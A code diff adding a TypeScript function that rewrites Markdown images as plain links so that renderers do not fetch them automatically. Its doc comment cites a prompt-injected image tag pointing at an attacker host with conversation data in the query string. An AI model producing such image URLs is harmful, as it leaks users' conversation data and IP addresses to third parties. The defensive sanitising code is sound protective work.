@@ -140,3 +140,23 @@ export function unwrapBoxedMinipages(content: string): string {
     })
   }).join('')
 }
+
+/**
+ * Turn Markdown images into links. Renderers fetch images without a click, so a prompt-injected
+ * `![](https://attacker/?d=...)` would leak conversation data and the reader's IP address.
+ */
+export function linkMarkdownImages(content: string): string {
+  return content.split(/(```[\s\S]*?```|`[^`\n]+`)/g).map((part, index) => {
+    if (index % 2 === 1) return part
+    let result = ''
+    for (let cursor = 0; cursor < part.length; cursor += 1) {
+      if (part[cursor] !== '!' || part[cursor + 1] !== '[' || isEscaped(part, cursor)) {
+        result += part[cursor]
+        continue
+      }
+      result += part[cursor + 2] === ']' ? '[🖼 Image' : '[🖼 '
+      cursor += 1
+    }
+    return result
+  }).join('')
+}
